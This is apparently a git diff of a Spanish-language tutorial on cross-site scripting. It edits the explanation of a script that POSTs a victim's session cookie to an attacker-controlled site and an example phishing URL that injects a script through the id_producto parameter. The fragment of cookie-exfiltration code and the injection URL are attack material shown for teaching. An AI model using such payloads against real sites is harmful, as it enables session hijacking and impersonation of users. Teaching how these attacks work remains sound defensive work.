@@ -83,12 +83,12 @@ $conn->close();
     xhr.send('cookies=' + encodeURIComponent(cookies));
 </script>
  ```
-Este script, envia por POST la cookie de sesión a un sitio web controlado por el atacante, por lo que si un usuario hace clic en un enlace que lleve incrustado este script, enviará su cookie de sesión al atacante.
+Este script, envia por POST la cookie de sesión a un sitio web controlado por el atacante, por lo que si un atacante consigue que una víctima ejecute dicho script, estará recibiendo la sesión de la víctima en su sitio malicioso y podrá impersonarla.
 
 Un enlace que podría recibir la víctima a través de un phishing se parecería a la siguiente:
 
 ```
-http://misitioweb.com/xss1.php?id_producto=<script></script>
+http://misitioweb.com/xss1.php?id_producto=<script>código malicioso</script>
 ```
 
 Posteriormente, el atacante, previo estudio del funcionamiento del sitio web que pretende atacar y conociendo las peticiones que utiliza el sitio web, puede intentar acciones maliciosas utilizando las cookies robadas:
